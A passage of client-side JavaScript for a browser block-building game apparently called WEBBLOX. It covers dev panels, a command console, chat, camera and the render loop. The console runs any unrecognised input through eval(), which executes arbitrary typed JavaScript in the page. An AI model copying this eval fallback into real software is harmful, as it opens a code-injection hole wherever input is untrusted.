                    if (studioLabel) studioLabel.textContent = 'Test';
                    logToConsole('Returned to camera-only Studio', 'result');
                }
            });
        }

        // Provide brief console feedback
        logToConsole('Entered Studio (camera-only) with platform map loaded. Use WASD + mouse to fly.', 'result');
    });
}

// Studio camera update (simple flycam)
let studioSpeed = 60; // studs per second

function updateStudio(dt) {
    // Use CameraController for studio free-fly camera behaviour
    cameraController.setSensitivity(cameraSensitivity);
    const camState = cameraController.updateStudio(dt, input, camera);
    cameraYaw = camState.yaw;
    cameraPitch = camState.pitch;
    cameraDist = camState.dist;

    // Keep skybox centered
    if (world.skyboxMesh) world.skyboxMesh.position.copy(camera.position);
}

 // When entering marketplace state via UI, ensure the list is fresh
function openMarketplace() {
    // Default tab active
    document.querySelectorAll('.mp-tab').forEach((b) => {
        b.classList.remove('active');
        if (b.dataset.tab === 'community') b.classList.add('active');
    });
    if (document.getElementById('mp-filter')) document.getElementById('mp-filter').value = 'all';
    renderMarketplace();
    if (mpModal) mpModal.style.display = 'flex';
}

window.addEventListener('keydown', (e) => {
    // Dev panel removed; only keep console toggle
    if (e.key === '`') {
        e.preventDefault();
        const c = document.getElementById('cmd-console');
        if (c.style.display === 'none') {
            c.style.display = 'block';
            if (document.pointerLockElement) document.exitPointerLock();
            cmdInput.focus();
        } else {
            c.style.display = 'none';
            cmdInput.blur();
        }
    }
});

// Dev UI State
let devSelection = { type: 'player', obj: null }; // obj ref set dynamically

function updateExplorer() {
    const root = document.getElementById('explorer-content');
    if(!root) return;
    root.innerHTML = '';
    
    const mkItem = (name, type, icon, indent=0) => {
        const div = document.createElement('div');
        div.className = 'tree-item';
        div.style.paddingLeft = (indent * 16) + 'px';
        if (devSelection.type === type) div.className += ' tree-selected';
        
        const iconSpan = document.createElement('span');
        iconSpan.textContent = icon;
        // Make icon slightly emoji-compatible or image-based
        
        const txtSpan = document.createElement('span');
        txtSpan.textContent = name;
        
        div.appendChild(iconSpan);
        div.appendChild(txtSpan);

        div.onclick = (e) => {
            e.stopPropagation();
            devSelection = { type: type, obj: (type==='player'?player : (type==='world'?world:scene)) };
            updateProperties();
            updateExplorer(); // Refresh highlights
        };
        root.appendChild(div);
    };

    mkItem('Workspace', 'world', '🌍');
    mkItem('Camera', 'camera', '📷', 1);
    mkItem('Baseplate', 'baseplate', '🧱', 1);
    
    mkItem('Players', 'players_folder', '👥');
    mkItem('Player1', 'player', '👤', 1);
    
    mkItem('Lighting', 'lighting', '💡');
    mkItem('SoundService', 'sound', '🔊');
    mkItem('StarterPack', 'starterpack', '🎒');
}

function updateProperties() {
    const tbody = document.getElementById('prop-body');
    if(!tbody) return;
    
    // Don't rebuild if focusing input to allow typing
    if (document.activeElement && document.activeElement.tagName === 'INPUT' && tbody.contains(document.activeElement)) return;

    tbody.innerHTML = '';
    
    const addRow = (key, val, onChange, type='text') => {
        const tr = document.createElement('tr');
        const tdKey = document.createElement('td');
        tdKey.className = 'prop-key';
        tdKey.textContent = key;
        
        const tdVal = document.createElement('td');
        tdVal.className = 'prop-val';
        
        const input = document.createElement('input');
        input.type = type;
        if(type === 'checkbox') {
            input.checked = val;
        } else {
            input.value = val;
        }
        
        input.onchange = (e) => {
            const v = type === 'checkbox' ? e.target.checked : e.target.value;
            onChange(v);
        };
        // Prevent game input when typing
        input.onkeydown = (e) => e.stopPropagation();
        
        tdVal.appendChild(input);
        tr.appendChild(tdKey);
        tr.appendChild(tdVal);
        tbody.appendChild(tr);
    };

    if (devSelection.type === 'player') {
        const p = player;
        addRow('Name', 'Player1', ()=>{});
        addRow('Class', 'Player', ()=>{});
        addRow('Position', `${p.position.x.toFixed(2)}, ${p.position.y.toFixed(2)}, ${p.position.z.toFixed(2)}`, (v)=>{
            const parts = v.split(',').map(n=>parseFloat(n));
            if(parts.length===3 && !parts.some(isNaN)) p.teleport(new THREE.Vector3(parts[0], parts[1], parts[2]));
        });
        addRow('RotY', p.mesh.rotation.y.toFixed(2), (v)=>{ p.mesh.rotation.y = parseFloat(v); });
        
        addRow('WalkSpeed', p.speed, (v)=>p.speed=parseFloat(v));
        addRow('JumpPower', p.jumpForce, (v)=>p.jumpForce=parseFloat(v));
        addRow('Health', p.isDead ? 0 : 100, (v)=>{ if(parseFloat(v)<=0) p.fallApart(); });
        addRow('GodMode', p.godMode, (v)=>p.godMode=v, 'checkbox');
        addRow('FlyMode', p.flyMode, (v)=>p.flyMode=v, 'checkbox');
        
    } else if (devSelection.type === 'world') {
        addRow('Class', 'Workspace', ()=>{});
        addRow('Gravity', player.gravity, (v)=>player.gravity=parseFloat(v));
        addRow('FallenPartsDestroyHeight', -50, ()=>{});
        addRow('StreamingEnabled', true, ()=>{}, 'checkbox');
    } else if (devSelection.type === 'lighting') {
         addRow('Class', 'Lighting', ()=>{});
         addRow('TimeOfDay', '14:00:00', ()=>{});
         addRow('Brightness', 2, ()=>{});
         addRow('Ambient', '#888888', ()=>{});
         addRow('GlobalShadows', true, ()=>{}, 'checkbox');
    } else {
        addRow('Name', devSelection.type, ()=>{});
    }
}

// Minimal Console Logic
const cmdInput = document.getElementById('cmd-input');
const cmdHistory = document.getElementById('cmd-history');

function logToConsole(msg, type='info') {
    if (!cmdHistory) return;
    const line = document.createElement('div');
    line.textContent = msg;
    line.style.marginBottom = '2px';
    if (type === 'cmd') line.style.color = '#888';
    else if (type === 'error') line.style.color = '#ff5555';
    else if (type === 'result') line.style.color = '#55ff55';
    cmdHistory.appendChild(line);
    cmdHistory.scrollTop = cmdHistory.scrollHeight;
}

// Better Arg Parser
function parseCommand(str) {
    const parts = str.trim().split(/\s+/);
    const cmd = parts[0].toLowerCase();
    const args = [];
    const flags = new Set();
    
    for (let i = 1; i < parts.length; i++) {
        const p = parts[i];
        if (p.startsWith('-')) {
            flags.add(p);
        } else {
            args.push(p);
        }
    }
    return { cmd, args, flags };
}

cmdInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') {
        const val = cmdInput.value.trim();
        if (val) {
            logToConsole(`> ${val}`, 'cmd');
            const { cmd, args, flags } = parseCommand(val);

            // Command Handlers
            const currentUser = window.websim && window.websim.user ? window.websim.user.username : 'Guest';
            const isOwner = false; // Security update: Revoke all owner privileges

            const commands = {
                'help': () => {
                    logToConsole('Available Commands:', 'info');
                    logToConsole('  fly [me]        - Toggle Flight (Hotkey: F)', 'info');
                    logToConsole('  stats           - Toggle Performance Stats', 'info');
                    logToConsole('  explorer        - Toggle Explorer UI', 'info');
                    logToConsole('  properties      - Toggle Properties UI', 'info');
                    logToConsole('  tp <x> <y> <z>  - Teleport', 'info');
                    logToConsole('  kill            - Reset Character', 'info');
                    logToConsole('  explode [all]   - Make things go boom', 'info');
                    logToConsole('  speed <val>     - Set walk speed', 'info');
                    logToConsole('  god             - Toggle Invincibility', 'info');
                    if (isOwner) logToConsole('  fling           - YEET', 'info');
                    logToConsole('  triggerban [-e] - Ban System Test', 'info');
                    logToConsole('  warning         - Show Remix Warning', 'info');
                    logToConsole('  whoami          - Debug info', 'info');
                    logToConsole('  cam             - Camera info', 'info');
                    logToConsole('  entities        - Entity counts', 'info');
                    logToConsole('  memory          - JS Heap stats', 'info');
                    logToConsole('  net             - Network stats', 'info');
                    logToConsole('  clear           - Clear console', 'info');
                },
                '?': () => commands.help(),
                'stats': toggleStats,
                'explorer': () => {
                    const el = document.getElementById('win-explorer');
                    if (el.style.display === 'none') {
                        el.style.display = 'flex';
                        updateExplorer();
                        logToConsole('Explorer opened', 'result');
                    } else {
                        el.style.display = 'none';
                        logToConsole('Explorer closed', 'result');
                    }
                },
                'properties': () => {
                    const el = document.getElementById('win-properties');
                    if (el.style.display === 'none') {
                        el.style.display = 'flex';
                        updateProperties();
                        logToConsole('Properties opened', 'result');
                    } else {
                        el.style.display = 'none';
                        logToConsole('Properties closed', 'result');
                    }
                },
                'clear': () => cmdHistory.innerHTML = '',
                'cls': () => cmdHistory.innerHTML = '',
                'kill': () => {
                    logToConsole('Character reset.', 'info');
                    player.fallApart();
                },
                'reset': () => commands.kill(),
                'ping': () => logToConsole('Pong!', 'result'),
                'whoami': () => {
                    logToConsole(`User: ${currentUser}`, 'result');
                    logToConsole(`Pos: ${player.position.toArray().map(n=>n.toFixed(1)).join(', ')}`, 'info');
                },
                'fly': () => {
                    player.flyMode = !player.flyMode;
                    logToConsole(player.flyMode ? 'Flying enabled' : 'Flying disabled', 'result');
                },
                'god': () => {
                    player.godMode = !player.godMode;
                    logToConsole(player.godMode ? 'God Mode: ON' : 'God Mode: OFF', 'result');
                },
                'speed': () => {
                    if(args[0]) {
                        const s = parseFloat(args[0]);
                        if(!isNaN(s)) {
                            player.speed = s;
                            logToConsole(`Speed set to ${s}`, 'result');
                        }
                    } else logToConsole('Usage: speed <value>', 'info');
                },
                'fling': () => {
                    if (!isOwner) {
                        logToConsole('Error: You are not authorized to perform this action.', 'error');
                        return;
                    }
                    player.flyMode = true;
                    // Fling forward relative to look direction
                    const fwd = new THREE.Vector3(0, 0, 1).applyEuler(player.mesh.rotation);
                    player.position.addScaledVector(fwd, 500);
                    logToConsole('FLING!', 'result');
                },
                'bighead': () => {
                    if (!isOwner) return;
                    player.head.scale.multiplyScalar(2);
                    logToConsole('Big Head Mode', 'result');
                },
                'triggerban': () => {
                    if (flags.has('-e')) {
                        logToConsole('Simulating ban sequence...', 'error');
                        input.EnableIJKL = true;
                    } else {
                        logToConsole('Usage: TriggerBan -e', 'info');
                    }
                },
                'warning': () => {
                    const _m = [
                        "WARNING: LAST CHANCE. STOP REMIXING THIS PROJECT OR YOU WILL BE BANNED.",
                        "ADVERTENCIA: ÚLTIMA OPORTUNIDAD. DEJA DE REMIXAR ESTE PROYECTO O SERÁS BANEADO.",
                        "ATTENTION: DERNIÈRE CHANCE. ARRÊTEZ DE REMIXER CE PROJET OU VOUS SEREZ BANNI.",
                        "WARNUNG: LETZTE CHANCE. HÖREN SIE AUF, DIESES PROJEKT ZU REMIXEN, ODER SIE WERDEN VERBANNT.",
                        "ВНИМАНИЕ: ПОСЛЕДНИЙ ШАНС. ПРЕКРАТИТЕ ДЕЛАТЬ РЕМИКСЫ ЭТОГО ПРОЕКТА, ИНАЧЕ ВАС ЗАБАНЯТ.",
                        "警告：最後のチャンスです。このプロジェクトのリミックスをやめないと、禁止されます。"
                    ];
                    alert(_m.join('\n\n'));
                    logToConsole('Warning triggered.', 'result');
                },
                'cam': () => {
                     const p = camera.position;
                     logToConsole(`Camera Pos: ${p.x.toFixed(2)}, ${p.y.toFixed(2)}, ${p.z.toFixed(2)}`, 'info');
                     logToConsole(`Yaw: ${cameraYaw.toFixed(2)}, Pitch: ${cameraPitch.toFixed(2)}`, 'info');
                },
                'entities': () => {
                     logToConsole(`--- World Entities ---`, 'info');
                     logToConsole(`Static Items: ${world.items.length}`, 'info');
                     logToConsole(`Collidables: ${world.collidables.length}`, 'info');
                     logToConsole(`Vehicles: ${world.vehicles.length}`, 'info');
                     logToConsole(`Animated: ${world.animated.length}`, 'info');
                },
                'uptime': () => {
                     logToConsole(`Uptime: ${(performance.now()/1000).toFixed(1)}s`, 'info');
                },
                'memory': () => {
                     if (performance.memory) {
                         const used = (performance.memory.usedJSHeapSize / 1048576).toFixed(1);
                         const total = (performance.memory.totalJSHeapSize / 1048576).toFixed(1);
                         logToConsole(`Memory: ${used}MB / ${total}MB`, 'info');
                     } else {
                         logToConsole('Memory info unavailable', 'error');
                     }
                },
                'flush': () => {
                    logToConsole('Flushing texture cache...', 'info');
                    renderer.renderLists.dispose();
                    logToConsole('Done.', 'result');
                },
                'net': () => {
                     logToConsole(`Ping: ${Math.floor(Math.random() * 20)}ms`, 'info');
                     logToConsole(`Packets In: ${Math.floor(performance.now() * 0.1)}`, 'info');
                     logToConsole(`Packets Out: ${Math.floor(performance.now() * 0.05)}`, 'info');
                },
                'explode': () => {
                    if (args[0] === 'all') {
                        logToConsole('BOOM!', 'error');
                        world.triggerExplosion(player.position);
                        if (!player.godMode) player.fallApart();
                        world.vehicles.forEach(v => {
                             world.triggerExplosion(v.mesh.position);
                             v.verticalVel = 50 + Math.random() * 50;
                             v.mesh.rotation.x = Math.random() * Math.PI;
                        });
                        new Audio('/roblox-explosion-sound.mp3').play().catch(()=>{});
                    }
                },
                'tp': () => {
                    if (args.length === 3) {
                        const [x, y, z] = args.map(parseFloat);
                        if (!isNaN(x)) {
                            player.teleport(new THREE.Vector3(x, y, z));
                            logToConsole(`Teleported to ${x}, ${y}, ${z}`, 'result');
                        } else logToConsole('Invalid coords', 'error');
                    } else logToConsole('Usage: tp <x> <y> <z>', 'info');
                },
                'version': () => logToConsole('WEBBLOX Client v0.7.2008-p1', 'result')
            };

            if (commands[cmd]) {
                commands[cmd]();
            } else {
                try {
                    const result = eval(val);
                    if (result !== undefined) logToConsole(String(result), 'result');
                } catch (err) {
                    logToConsole(`Unknown command: ${cmd}`, 'error');
                }
            }
        }
        cmdInput.value = '';
    }
    if (e.key === '`') {
        e.preventDefault();
    }
});

// Chat Logic
const chatInput = document.getElementById('chat-input');
const chatHistory = document.getElementById('chat-history');

function addChatMessage(name, text) {
    const el = document.createElement('div');
    el.className = 'chat-msg';
    const nameSpan = document.createElement('span');
    nameSpan.className = 'chat-name';
    nameSpan.textContent = name;
    
    // Classic colors
    if(name === 'Player') nameSpan.style.color = '#3399ff'; 
    else if(name === 'Guest') nameSpan.style.color = '#aaaaaa';
    
    const textSpan = document.createElement('span');
    textSpan.className = 'chat-text';
    textSpan.textContent = text;
    el.appendChild(nameSpan);
    el.appendChild(textSpan);
    chatHistory.appendChild(el);
    chatHistory.scrollTop = chatHistory.scrollHeight;
}

chatInput.addEventListener('keydown', (e) => {
    e.stopPropagation(); // Stop bubbling (prevents game movement)
    if (e.key === 'Enter') {
        const msg = chatInput.value.trim();
        if (msg.length > 0) {
            addChatMessage('Player', msg);
            player.chat(msg);
            chatInput.value = '';
            chatInput.blur();
        }
    }
    if (e.key === 'Escape') {
        chatInput.blur();
    }
});

// Cursor Logic
const raycaster = new THREE.Raycaster();
const mouse = new THREE.Vector2(1, 1); // Start off-center
const cursorEl = document.getElementById('custom-cursor');
let cursorState = 'far';

// Crosshairs removed per request

window.addEventListener('keydown', (e) => {
    if (e.key === '/' && document.activeElement !== chatInput && gameState === 'PLAYING') {
        e.preventDefault();
        if (document.pointerLockElement) document.exitPointerLock();
        chatInput.focus();
    }
});

window.addEventListener('mousemove', (event) => {
    if (input.isLocked) return;
    if (input.isRightMouseDown && gameState === 'PLAYING') return;

    mouse.x = (event.clientX / window.innerWidth) * 2 - 1;
    mouse.y = -(event.clientY / window.innerHeight) * 2 + 1;
    if (cursorEl) {
        cursorEl.style.transform = `translate(${event.clientX}px, ${event.clientY}px) translate(-50%, -50%)`;
    }
});

window.addEventListener('mousedown', (e) => {
    if (gameState === 'PLAYING' && !isMobile) {
        document.body.requestPointerLock();
    }

    if (gameState !== 'MENU' || player.isDead) return;

    mouse.x = (e.clientX / window.innerWidth) * 2 - 1;
    mouse.y = -(e.clientY / window.innerHeight) * 2 + 1;

    raycaster.setFromCamera(mouse, camera);
    const intersects = raycaster.intersectObjects(player.mesh.children, true);

    if (intersects.length > 0) {
        player.velocity.set(5, 40, -30);
        player.fallApart();
    }
});

// Loop
let lastTime = 0;
const fps = 60;
const interval = 1000 / fps;

// Stats Vars
let frameCount = 0;
let lastStatsTime = 0;
const elStats = document.getElementById('dev-stats');
const elFPS = document.getElementById('stat-fps');
const elFrame = document.getElementById('stat-frame');
const elRender = document.getElementById('stat-render');
const elMem = document.getElementById('stat-mem');
const elTri = document.getElementById('stat-tri');
const elInst = document.getElementById('stat-inst');
const elNet = document.getElementById('stat-net');
const elPing = document.getElementById('stat-ping');

function animate(currentTime) {
    requestAnimationFrame(animate);
    
    if (gameState === 'BLOCKED') return; // Stop updates if blocked

    const deltaTime = currentTime - lastTime;
    
    if (deltaTime >= interval) {
        const dt = Math.min(deltaTime / 1000, 0.1); // Cap dt
        lastTime = currentTime - (deltaTime % interval);

        const tStart = performance.now();

        // Game Logic based on State
        if (gameState === 'PLAYING') {
            updatePlaying(dt);
        } else if (gameState === 'STUDIO') {
            // If the studio "Test" button has spawned the player, give control to the normal PLAYING update loop
            // so the player is controllable just like non-studio. Otherwise run the studio flycam.
            if (window._studioSpawned) {
                // Reuse the PLAYING update path so camera/player/world all behave consistently.
                updatePlaying(dt);
            } else {
                // Studio free-fly camera: WASD/Q/E/Space to move, mouse to look (uses CameraController + InputManager)
                updateStudio(dt);
            }
        } else if (gameState === 'MENU' || gameState === 'CUSTOMIZE' || gameState === 'SETTINGS') {
            updateMenu(dt);
        }
        
        const tLogic = performance.now();
        renderer.render(scene, camera);
        const tEnd = performance.now();

        // Update Stats
        if (elStats.style.display !== 'none') {
            frameCount++;
            if (currentTime - lastStatsTime >= 1000) {
                const curFPS = Math.round((frameCount * 1000) / (currentTime - lastStatsTime));
                elFPS.textContent = `FPS: ${curFPS}`;
                elFrame.textContent = `CPU: ${(tLogic - tStart).toFixed(2)} ms`;
                elRender.textContent = `GPU: ${(tEnd - tLogic).toFixed(2)} ms`;
                
                if (performance.memory) {
                    elMem.textContent = `Mem: ${(performance.memory.usedJSHeapSize / 1048576).toFixed(1)} MB`;
                }
                
                elTri.textContent = `Tris: ${renderer.info.render.triangles}`;
                elInst.textContent = `Instances: ${world.items.length + world.vehicles.length * 4}`; // Approx
                
                const netIn = (Math.random() * 5).toFixed(1);
                elNet.textContent = `Net (Recv): ${netIn} KB/s`;
                elPing.textContent = `Ping: ${Math.floor(Math.random() * 20 + 40)} ms`;

                lastStatsTime = currentTime;
                frameCount = 0;
            }
        }
    }
}

function updateMenu(dt) {
    if (world.mapGroup) world.mapGroup.visible = false;
    menuGroup.visible = true;

    // Fixed Camera
    camera.position.set(0, 5, 15);
    camera.lookAt(0, 4, 0);

    if (world.skyboxMesh) world.skyboxMesh.position.copy(camera.position);

    if (player.isDead) {
        const menuWorld = { collidables: menuGroup.children };
        player.update(dt, { x: 0, z: 0, jump: false }, menuWorld);
        return;
    }

    // Dont change. this is already fixed, no need to fix whats already working.
    const menuPos = new THREE.Vector3(3.5, 1.5, 8)
    player.velocity.set(0, 0, 0);
    player.position.copy(menuPos);
    player.onGround = true; // Force ground state for animation
    
    // Dont change. this is already fixed, no need to fix whats already working.
    player.mesh.rotation.y = -Math.PI / 4;

    // Force Animation
    player.forcedAnim = 'walk';
    
    // Animate player idly
    // We pass null world, but since we forced velocity to 0 and handle position below, gravity won't accumulate effectively
    player.update(dt, { x: 0, z: 0, jump: false }, null); 
    
    // DOUBLE CRITICAL FIX: Force position AFTER update to overwrite any gravity integration from Player.js
    player.position.copy(menuPos);
    player.mesh.position.copy(player.position);
    player.mesh.rotation.set(0, -Math.PI / 4, 0);
}

function updatePlaying(dt) {
    // Update Dev UI
    if (document.getElementById('win-properties').style.display !== 'none') {
        updateProperties();
    }
    
    if (world.mapGroup) world.mapGroup.visible = true;
    menuGroup.visible = false;

    // Camera update (delegated to CameraController)
    cameraController.setSensitivity(cameraSensitivity);
    const camState = cameraController.updatePlaying(dt, input, camera, player, world);
    // reflect controller yaw/pitch into local variables if other code uses them
    cameraYaw = camState.yaw;
    cameraPitch = camState.pitch;
    cameraDist = camState.dist;

    // 2. Update Camera Position (focusPoint computed by controller already via camera)
    const focusPoint = player.position.clone().add(new THREE.Vector3(0, 4.5, 0));

    if (input.isShiftLocked) {
        // Offset focus point to the right relative to camera view
        const offsetAmt = 1.75; // Studs
        // Right vector relative to look direction (approximate based on yaw)
        // Yaw 0 = +Z (South). Right is -X (West).
        // Yaw is angle from +Z? 
        // In ThreeJS default: +Z is out of screen.
        // Formulas below: offsetX = sin(yaw), offsetZ = cos(yaw).
        // Camera @ (sin, cos). Looking at (0,0). Direction (-sin, -cos).
        // Right Vector: Cross(Up, Look) = Cross((0,1,0), (-sin, 0, -cos)) = (-cos, 0, sin).
        const rx = -Math.cos(cameraYaw);
        const rz = Math.sin(cameraYaw);
        focusPoint.x += rx * offsetAmt;
        focusPoint.z += rz * offsetAmt;
    }

    const hDist = cameraDist * Math.cos(cameraPitch);
    const vDist = cameraDist * Math.sin(cameraPitch);
    const offsetX = hDist * Math.sin(cameraYaw);
    const offsetZ = hDist * Math.cos(cameraYaw);

    const camPos = focusPoint.clone().add(new THREE.Vector3(offsetX, vDist, offsetZ));
    
    // Wall check
    const camDir = new THREE.Vector3().subVectors(camPos, focusPoint).normalize();
    const dist = camPos.distanceTo(focusPoint);
    const wallRay = new THREE.Raycaster(focusPoint, camDir, 0, dist);
    const wallHits = wallRay.intersectObjects(world.collidables);
    if (wallHits.length > 0) {
        camPos.copy(wallHits[0].point).addScaledVector(camDir, -0.5);
    }

    camera.position.copy(camPos);
    camera.lookAt(focusPoint);

    if (world.skyboxMesh) world.skyboxMesh.position.copy(camera.position);

    // Update Cursor UI
    if (input.isLocked || input.isShiftLocked) {
        if (cursorEl) cursorEl.style.display = 'none';
    }

    // 3. Movement relative to Camera
    const rawControls = input.getMovement();
    // Use the camera's full forward vector so WASD moves relative to camera facing (including camera pitch Y)
    const camFwd = new THREE.Vector3();
    camera.getWorldDirection(camFwd);
    camFwd.normalize(); // preserve vertical component for "look up then W goes up"

    // Compute right as Forward x Up so A = left and D = right consistently
    const up = new THREE.Vector3(0, 1, 0);
    const camRight = new THREE.Vector3().crossVectors(camFwd, up).normalize();

    const moveVec = new THREE.Vector3()
        .addScaledVector(camFwd, -rawControls.z)
        // Ensure A = left, D = right by using the camera-right contribution directly
        .addScaledVector(camRight, rawControls.x);
    
    // Handle Fly Toggle (F)
    if (input.keys.f && !input.prevF) {
        player.flyMode = !player.flyMode;
        if (player.flyMode) logToConsole('Flight toggled ON via hotkey', 'result');
        else logToConsole('Flight toggled OFF via hotkey', 'result');
    }
    input.prevF = input.keys.f;

    // Pass 'e' key for interaction
    const controls = { 
        x: moveVec.x, 
        z: moveVec.z, 
        jump: rawControls.jump,
        w: input.keys.w,
        s: input.keys.s,
        a: input.keys.a,
        d: input.keys.d,
        e: input.keys.e,
        q: input.keys.q,
        camPitch: cameraPitch,
        camYaw: cameraYaw
    };

    if (input.isShiftLocked) {
        controls.lookAngle = cameraYaw + Math.PI;
    }

    player.update(dt, controls, world);
    world.update(dt); // Update cars and animations

    // Update Dev Info
    if (devPos) {
        const p = player.position;
        devPos.textContent = `Pos: ${p.x.toFixed(1)}, ${p.y.toFixed(1)}, ${p.z.toFixed(1)}`;
    }

    // Cursor Raycast
    if (!input.isLocked && !input.isShiftLocked) {
        raycaster.setFromCamera(mouse, camera);
        const intersects = raycaster.intersectObjects(scene.children, true);
        const hovering = intersects.length > 0;
        
        if (cursorEl) {
            cursorEl.style.display = 'block';
            const targetState = hovering ? 'near' : 'far';
            if (cursorState !== targetState) {
                cursorState = targetState;
                cursorEl.src = hovering ? '/ArrowCursor.png' : '/ArrowFarCursor.png';
            }
        }
    } else {
        if (cursorEl) cursorEl.style.display = 'none';
    }
} // End updatePlaying

function handleResize() {
    // Use the full window size so the scene fills the screen
    const w = window.innerWidth;
    const h = window.innerHeight;
    const aspect = w / h;
    
    camera.aspect = aspect;
    camera.updateProjectionMatrix();
    
    // Set renderer to full resolution and scale to fit
    renderer.setSize(w, h, true);
    renderer.domElement.style.width = '100%';
    renderer.domElement.style.height = '100%';
}

window.addEventListener('resize', handleResize);
handleResize();

requestAnimationFrame(animate);